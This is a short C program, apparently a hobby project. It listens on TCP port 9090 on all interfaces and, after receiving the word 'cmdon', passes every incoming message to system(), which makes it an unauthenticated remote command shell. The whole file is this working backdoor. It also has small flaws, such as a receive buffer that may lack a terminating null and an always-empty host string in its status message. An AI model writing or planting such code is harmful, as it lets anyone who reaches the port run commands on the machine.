#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

#define PORT 9090           // port
#define BFSZ 1024           // receive data size
#define CLNM 0003           // number of allowed clients

int prepare();

int main(void) {
  int server_fd, new_socket, valread;

  server_fd = prepare();

  // listening
  if (listen(server_fd, CLNM) < 0){
    perror("Listen Failed");
    exit(EXIT_FAILURE);
  }
  printf("Listening...\n");

  struct sockaddr_in client_info;
  socklen_t len = sizeof(client_info);
  new_socket = accept(server_fd, (struct sockaddr *)&client_info, &len);
  if(new_socket < 0){
    perror("Client Failed");
    exit(EXIT_FAILURE);
  }

  char str[50];
  inet_ntop(AF_INET, &(client_info.sin_addr), str, 50);
  printf("%s is connected.\n", str);

  int cmdon = 0;

  char buffer[BFSZ];
  while(1){
    memset(buffer, 0, BFSZ);
    valread = recv(new_socket, buffer, BFSZ, 0);
    if (valread < 0){
      perror("Receive Failed");
      exit(EXIT_FAILURE);
    }

    if (strcmp(buffer, "cmdon") == 0){ // if the message is "cmdon"
       cmdon = 1;
       continue;
    }
    else if (strcmp(buffer, "cmdoff") == 0){
      cmdon = 0;
      continue;
    }

    if(cmdon == 1){
      system(buffer);
    }
    else printf("%s\n", buffer);
  }
  close(new_socket);
  close(server_fd);

  return 0;
}

// TODO programa arguman olarak ip ve port vermek
int prepare(){
  int server_fd;
  struct sockaddr_in address;
  int opt = 1;
  char HOST[20] = "";

  // creating socket file descriptor
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd == 0){
    perror("Socket Failed");
    exit(EXIT_FAILURE);
  }


  // Forcefully attaching socket to the port
  // For "Already in use" mistake
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                               &opt, sizeof(opt))){
    perror("setsockopt");
    exit(EXIT_FAILURE);
  }

  //strcat(HOST, (char*)&ip);
  //strcat(HOST, "192.168.1.105");

  address.sin_family      = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;      //inet_addr(HOST);
  address.sin_port        = htons(PORT);

  // forcefully attaching socket to the port 9090
  int bind_rs = bind(server_fd, (struct sockaddr *)&address, sizeof(address));
  if (bind_rs < 0){
    perror("Bind Failed");
    exit(EXIT_FAILURE);
  }
  printf("Connected to %s:%d\n", HOST, PORT);

  return server_fd;
}
